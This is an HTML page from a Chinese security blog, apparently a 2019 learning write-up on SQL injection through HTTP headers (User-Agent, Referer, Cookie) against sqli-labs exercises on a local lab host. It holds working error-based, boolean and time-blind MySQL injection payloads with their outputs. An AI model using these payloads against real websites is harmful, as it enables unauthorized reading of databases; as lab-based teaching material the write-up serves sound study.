@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Focusing on security of AI, and distributed AI."><title>http头部注入 | realyee's blog</title><link rel="stylesheet" type="text/css" href="/blog/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/latest/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/grids-responsive-min.min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/latest/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/blog/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/blog/favicon.ico"><link rel="apple-touch-icon" href="/blog/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/blog/apple-touch-icon.png"><script src="https://www.googletagmanager.com/gtag/js?id=G-HT3KXNPC43" async></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-HT3KXNPC43');
+</script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement('script');
+  hm.src = 'https://hm.baidu.com/hm.js?' + '81692a5a3ea48096c98733a7d4bfef6b';
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+  })();</script><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/latest/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/latest/toastr.min.css"><div class="darkmode-toggle">🌓</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
+var toggle = document.querySelector('.darkmode-toggle');
+var html = document.querySelector('html');
+
+html.dataset.dark = localStorage.dark || prefersDarkMode.matches;
+
+toggle.addEventListener('click', () => {
+localStorage.dark = !(html.dataset.dark == 'true');
+html.dataset.dark = localStorage.dark;
+});</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">http头部注入</h1><a id="logo" href="/blog/.">realyee's blog</a><p class="description">Security and privacy of AI, and distributed AI, Cybersecurity</p></div><div id="nav-menu"><a class="current" href="/blog/."><i class="fa fa-home"> Home</i></a><a href="/blog/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/blog/tags/"><i class="fa fa-tag"> Tags</i></a><a href="/blog/history/"><i class="fa fa-book"> History</i></a><a href="/blog/cheatsheet/"><i class="fa fa-user"> Cheatsheet</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">http头部注入</h1><div class="post-meta">2019-07-30<span> | </span><span class="category"><a href="/blog/categories/websec/">websec</a><a href="/blog/categories/websec/sql-injection/">sql injection</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 3.5k</span><span class="post-meta-item-text"> Words</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 13</span><span class="post-meta-item-text"> Minutes</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#http-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">http 头部注入简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http-%E5%A4%B4%E9%83%A8%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">HTTP 头部详解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text">注入姿势</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#user-agent-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">user-agent 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">判断注入类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%9C%89%E6%95%88-payload"><span class="toc-number">2.3.</span> <span class="toc-text">构造有效 payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.</span> <span class="toc-text">测试报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.2.</span> <span class="toc-text">测试布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.3.</span> <span class="toc-text">测试时间盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#referer-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">referer 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">检测注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.3.</span> <span class="toc-text">检测注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">测试报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">检测版本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.2.</span> <span class="toc-text">测试延时注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text">测试布尔注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie-%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">cookie 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">4.1.</span> <span class="toc-text">简介</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%9B%9E%E9%A1%BE"><span class="toc-number">5.</span> <span class="toc-text">总结回顾</span></a></li></ol></div></div><div class="post-content"><h1 id="http-头部注入简介">http 头部注入简介</h1>
+<p>根据常见性依次有：User-Agent、cookie、X-Forwarded-For、Client-IP、Referer、Host
+等。</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/792048d08ebc">X-Forwarded-For
+的一些理解</a></p>
+<h2 id="http-头部详解">HTTP 头部详解</h2>
+<p>User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>
+<p>Cookie：网站为了辨别用户身份、进行 session
+跟踪而储存在用户本地终端上的数据（通常经过加密）.</p>
+<p>X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP
+的请求端真实的 IP,（通常一些网站的防注入功能会记录请求端真实 IP
+地址并写入数据库 or 某文件[通过修改 XXF 头可以实现伪造 IP]）.</p>
+<p>Clien-IP：同上，不做过多介绍.</p>
+<p>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.</p>
+<p>Host：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号</p>
+<h2 id="注入姿势">注入姿势</h2>
+<p>首先介绍，我认为测试 http -header 头部的正确姿势</p>
+<p>首先注册该网站账号（这里注意一般注册时用户名和密码不要是一样的，要有区分度。），先用正确的账号密码测试，因为据我观测：在登录（不管账号密码正确与否）时，都会有
+user-agent 与 referer（如果说的不对，还请大佬指教。），cookie
+初次登录成功之后才会有（所以测试 cookie
+是需要有一个账号密码的）当然，你要是测试 post
+注入什么的就没有必要注册账号了。这里是指 http header 注入。</p>
+<p>下面介绍两种注入姿势：</p>
+<p>哪种姿势适合你，你就选择哪种。</p>
+<ol type="1">
+<li>使用 hackbar 在 post 数据处，输入正确的用户名和密码，并打开 hackbar
+中 user agent，通过查看 network 中的请求，复制自己的 useragent 标识，到
+hackbar 的 useragent 处，</li>
+<li>使用 burp repeater 抓包，然后进行重放，值得一提的是，repeater 中的
+render 渲染功能还行，可以直接渲染出页面。</li>
+</ol>
+<p>注：本来用 hackbar 修改 referer 头，但是不管用，后来发现，hackbar
+没有改掉 referer，一个 bug（可能是由于 chrome
+某些改进的参数导致，注意当你感觉使用一个工具产生的结果与想的不一样的话，不妨试试别的工具。或者通过别的方式验证一下。），最后使用
+burp suite 吧。（下面的回显报错可以在 burp repeater 的报文或
+<strong>render 渲染里面看到</strong>，建议去 render
+看，因为有一些字符报文中显示不出来）。我们不是大神，不可能遇到一个问题，没有完美的工具就自己写一个工具。每种工具都有它的优缺点，我们要善于利用它的优点，避免它的缺点。在
+web 安全中有时干一件事情，需要用到几个工具，这是很正常的事情。</p>
+<h1 id="user-agent-注入">user-agent 注入</h1>
+<p><strong>我猜测</strong>：网站记录用户的 user-agent
+存入数据库（<strong>怎么存？当然是使用 insert
+语句啦，这是我们要知道的。</strong>），一方面是为了识别用户设备，另一方面，由于设备不同，可能会有不同的优化/处理吧。</p>
+<p>下面熟悉的流程步骤又来了，现在就把 useragent 当成你 post
+注入时的输入框，流程大致一样。</p>
+<h2 id="测试注入点">测试注入点</h2>
+<p>在 useragent
+内容的后面测试单引号/双引号/单引号括号/双引号括号/单引号双括号/双引号双括号/
+等。 看页面变化及报错。</p>
+<p>有的时候是直接报错语句，有的时候，返回 401
+Unauthorzed，具体看情况。</p>
+<p>我的测试 payload：</p>
+<blockquote>
+<p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/75.0.3770.142 Safari/537.36'</p>
+</blockquote>
+<p>回显：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version for the right syntax to use
+near '192.168.107.1', 'admin')' at line 1</p>
+</blockquote>
+<p>注入点存在。</p>
+<h2 id="判断注入类型">判断注入类型</h2>
+<p>根据报错：192.168.107.1', 'admin')，这里猜测该网站通过将 user agent
+插入了数据库来验证身份（当然，目前据我所知就两种：一种是不存储，一种是
+insert 插入，报错了，肯定就是 insert 存储了呗）
+这里由于用户名与密码是一样的，不能区分，admin
+是啥，不过，在本例中也没关系（但是，别的情况可能就有关系了。账号密码还是不要相同的好）
+猜测大致 sql 查询语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into tbl_name <span class="title function_ invoke__">values</span>(<span class="variable">$useragent</span>,<span class="variable">$ip</span>,<span class="variable">$useraname</span>/<span class="variable">$password</span>);</span><br></pre></td></tr></table></figure>
+<p>即：insert 语句、三个字段、字段用单引号包裹</p>
+<h2 id="构造有效-payload">构造有效 payload</h2>
+<p>这里不是 select 就别用什么 order by 了，也就没有显示位一说了。</p>
+<p>对于 insert 语句注入的话，一般就是盲注了，报错、布尔、时间三种。</p>
+<p>注：由于设备的 User-Agent 太长了，下面我用 Mozilla/5.0 代替全部
+User-Agent 内容，即：Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142
+Safari/537.36。这里想说 User-Agent
+的原始数据不要改吧，万一判断长度什么的，改短了再出别的事情了（总之，看你自己了。）</p>
+<h3 id="测试报错注入">测试报错注入</h3>
+<p>paylaod:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1 and extractvalue(1,concat(0x23,(select version())))),(select 1))#</span></span><br></pre></td></tr></table></figure>
+<p>当然，我一开始使用的注释是 -- ，但是不管用（php
+给我把空格去掉了，我在 mysql 执行该 payload
+生成的语句就可以），于是换成了 #</p>
+<p>回显：XPATH syntax error: '#5.5.53'</p>
+<p>测试成功，后面的步骤与方法你懂得。</p>
+<p>学习了 mysql 注入天书对本节的注入流程后，我发现有另一种构造方式。</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1</span><br></pre></td></tr></table></figure>
+<p>实际执行的语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`)</span><br><span class="line">VALUES (&#x27;&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1&#x27;, &#x27;192.168.107.1&#x27;, &#x27;admin&#x27;)</span><br></pre></td></tr></table></figure>
+<p>此 payload 以不改变其他字段内容为出发点，利用 and 连接
+布尔值，返回布尔值，而布尔值可以与 0 或 1
+进行自动转换的特点构造而成。（注：空串可以自动转化为 0 以及布尔值
+false）。</p>
+<p>下面证实我的说法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> temp <span class="keyword">values</span>(<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>,<span class="string">&#x27;me&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> temp;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> uname <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> green <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> temp <span class="keyword">values</span>(<span class="string">&#x27;&#x27;</span><span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>,<span class="string">&#x27;me&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> temp;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> uname <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> green <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> me    <span class="operator">|</span> pwd      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>另一个 payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and updatexml(1,concat(0x7e,(select user()),0x7e),1),1,1)#</span></span><br></pre></td></tr></table></figure>
+<p>思想与上面有共同之处，就不再讲解。</p>
+<p>小结： 构造 payload 两种思路</p>
+<ol type="1">
+<li>只破坏（使用）该字段，闭合前单引号，使用 and
+来与前面的单引号组成一个字段下 and 的运算数，同时再使用一个 and '1
+来闭合该字段原来后单引号。</li>
+<li>闭合该字段，再后面自己构造一个字段用来注入</li>
+</ol>
+<h3 id="测试布尔盲注">测试布尔盲注</h3>
+<p>Mozilla/5.0', (select 1),(select 1)) and 1=1# 报错。</p>
+<p>报错原因： 之前我们可以用 and 1=1 或 and 1=2 测试布尔盲注的原因是
+where 与 and 的连用。 'where id =1 and 1=2' 中的 and 的运算数分别为：id
+=1 与 1=2，二者均为布尔值。数据库遍历每条数据，查询出满足 id=1 且 1=2
+的数据。</p>
+<p>而现在是 insert into 语句，and
+两侧要求为布尔值，而此时显然不满足，所以报 and
+那里的错。这里我们知道在插入语句 insert
+使用布尔盲注是不太好实现的。因为你没有办法通过改变你插入的 payload
+来改变页面报错与否。</p>
+<p>比如：Mozilla/5.0', ((select 1) and
+sleep(3)),(select((if(left(version(),1)&gt;4,1,0)))))#
+原本正常情况下，你使用
+判断版本每个字符返回的真假来控制页面正常与否，而在 insert
+语句中，该真假只是被插入到数据库中，你并看不到它，因此页面一直显示正常。</p>
+<p>这里没有出错点使你的页面随着你的判断字符大小变化。当然，你也可以构造随着你的判断正误而报错与否的语句，要构造的话，就需要用到一些报错，所以不知道这算布尔盲注还是算报错盲注，照我来说，还是算布尔盲注，因为报错盲注是指通过报错把敏感信息直接显示出来。</p>
+<p>下面给出一个 payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1),(select (if(left(version(),1)&gt;5,1,0))=1 or pow(999,999)))#</span></span><br></pre></td></tr></table></figure>
+<p>利用了 double 溢出报错与 or 的短路特性</p>
+<p>当然，实际渗透过程中，有正规的报错注入点，我们就不用测布尔盲注了。
+我这里自己构造 payload 只是因为构造有效的 payload 让人快乐，haha</p>
+<p>这里我遇到一个博文写的 User-agent
+注入，使用正常的布尔盲注。要是数据库语句也是 insert into
+的话，那就奇怪了。当然，咱也不知道 sql 语句是啥，给出链接仅供参考。</p>
+<p><a
+target="_blank" rel="noopener" href="https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888">SQL
+injection through User-Agent</a></p>
+<h3 id="测试时间盲注">测试时间盲注</h3>
+<p>构造 payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, ((select 1) and sleep(3)),(select 1)) #</span></span><br></pre></td></tr></table></figure>
+<p>延时成功</p>
+<p>下面给出后续时间盲注 payload 示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span><span class="string">&#x27;, (select 1),(select((if(left(version(),1)&gt;5,1,sleep(3))))))#</span></span><br></pre></td></tr></table></figure>
+<h1 id="referer-注入">referer 注入</h1>
+<h2 id="简介">简介</h2>
+<blockquote>
+<p>HTTP 来源地址（<strong>referer</strong>，或 <strong>HTTP
+referer</strong>）是 HTTP
+表头的一个字段，用来<strong>表示从哪儿链接到目前的网页</strong>，采用的格式是
+URL。换句话说，借着 HTTP
+来源地址，目前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。</p>
+</blockquote>
+<h2 id="检测注入点">检测注入点</h2>
+<p>这一步不进行了，因为都知道是 referer 注入了。</p>
+<p>目前来看，检测注入点顺序：地址栏-&gt;搜索栏-&gt;登录栏-&gt;http
+头部（User-Agent-&gt;referer-&gt;cookie）</p>
+<h2 id="检测注入类型">检测注入类型</h2>
+<p>加个单引号，raw 中回显报错：</p>
+<p>You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version for the right syntax to use
+near '192.168.107.1')' at line 1</p>
+<p>注：repeater 中的 raw 和 render 要对比着看，正如前面所说，raw
+中有些字符不显示。</p>
+<p>render 中查看，</p>
+<figure>
+<img
+src="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/less19_render.png"
+alt="render" />
+<figcaption aria-hidden="true">render</figcaption>
+</figure>
+<p>说明存在注入，根据 render 的页面我们就可以更加清楚地判断后台 sql
+查询语句。</p>
+<p>于是我们知道 referer、ip
+两个字段，并且它们分别用单引号包裹。这样我们可以沿用 user agent
+的注入思路：只使用（破坏）该注入字段（即：referer ）或者闭合
+referer，使用其后面的字段。</p>
+<p>下面测试三种盲注。</p>
+<h3 id="测试报错注入-1">测试报错注入</h3>
+<h4 id="检测版本">检测版本</h4>
+<p>根据上面只使用（破坏）一个字段的思想，而且也只有一个字段让我们用，构造一下
+paylaod</p>
+<p>payload（加在 referer 后面）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,(extractvalue(1,concat(0x23,(select version()))))) #</span></span><br></pre></td></tr></table></figure>
+<p>回显：XPATH syntax error: '#5.5.53' 成功了，报错注入可行成功</p>
+<h3 id="测试延时注入">测试延时注入</h3>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,(select 1 from (select sleep(20))a)) #</span></span><br></pre></td></tr></table></figure>
+<p>根据人对返回时间的感觉，当然，burp 的 repeater
+可以看响应时间，在右下角，写着多少毫秒呢。延时注入成功。</p>
+<h3 id="测试布尔注入">测试布尔注入</h3>
+<p>布尔注入的情况与前面 insert user agent 一样。</p>
+<h1 id="cookie-注入">cookie 注入</h1>
+<h2 id="简介-1">简介</h2>
+<blockquote>
+<p>cookie 就是浏览器储存在用户电脑上的一小段文本文件。cookie
+是纯文本格式，不包含任何可执行的代码。一个 Web
+页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web
+服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个
+cookie，只要这个 cookie
+存在并可以，用户就可以自由浏览这个网站的任意页面。再次说明，cookie
+只包含数据，就其本身而言并不有害。</p>
+</blockquote>
+<p>cookie 注入</p>
+<p>首先使用正确的用户名与密码登录，此时我们获得 cookie ：uname=admin</p>
+<p>下面对 cookie 进行注入，与上面注入类似，下面给出 payload 示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span></span><br></pre></td></tr></table></figure>
+<p>cookie 注入需要注意一点：cookie 的格式：name=value，比如这里：cookie
+就是 uname=后面一堆。</p>
+<p>sqli-lab 第 21 关：我们查看 cookie
+可以看到，明显是被编码了的，因此，我们猜测编码方式为 base
+64，（为什么猜测是它呢？1. 常用 2. 经验），然后和 20
+关相同，只是我们构造完 cookie 的 payload，用 base64 编码一下就好了。</p>
+<p>sqli-lab 第 22 关：有了 21 关的基础，我们先解密抓包或在开发者工具找的
+cookie，然后进行检测加一个单引号，不报错，换成双引号，报错如下：</p>
+<blockquote>
+<p><strong>Issue with your mysql: You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server version for the
+right syntax to use near '"admin"" LIMIT 0,1' at line 1</strong></p>
+</blockquote>
+<p>于是我们可以知道 cookie 由双引号包裹。其余的和 21 关一样。</p>
+<h1 id="总结回顾">总结回顾</h1>
+<ol type="1">
+<li><p>工具的缺点：hackbar 不能用 referer 头，burp suite repeater 的 raw
+中不显示一些特定字符，需要同时参考 render。</p></li>
+<li><p>chrome 推荐使用谷歌商店里那个，图标为黑色底色有一个白色 H 的
+hackbar （Offered by: 0140454）可以修改 referer，挺好。</p></li>
+<li><p>hackbar 有 burp 插件了，在 github
+上可以找到，这样有完美了，可以只使用一种工具了：浏览器（hackbar
+浏览器插件）或 burp+hackbar（burp 插件）来测试。其中 hackbar
+浏览器插件的添加 header
+时，可以直接输入名来搜索，然后选择就行。</p></li>
+</ol>
+<p>参考资料：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27553821">浅谈 http
+头注入(附案例)</a></p>
+</blockquote>
+</div><div class="tags"></div><div class="post-nav"><a class="pre" href="/blog/2019/08/02/websec/sql_injection/sql_jnjection_intro/">sql注入介绍</a><a class="next" href="/blog/2019/07/29/websec/sql_injection/View%20of%20the%20injection%20point/">对检测注入点的小想法</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/" title=""><img class="nofancybox" src="/blog/img/avatar.png"/></a><p>What keeps me alive is my love for people and life and my desire to explore the unknown</p><a class="info-icon" href="mailto:findrealyee@outlook.com" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/realyee/" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Cryptography/">Cryptography</a><span class="category-list-count">29</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Cryptography/math/">math</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Cryptography/zero-knowledge-proof/">zero-knowledge proof</a><span class="category-list-count">20</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Golang/">Golang</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" 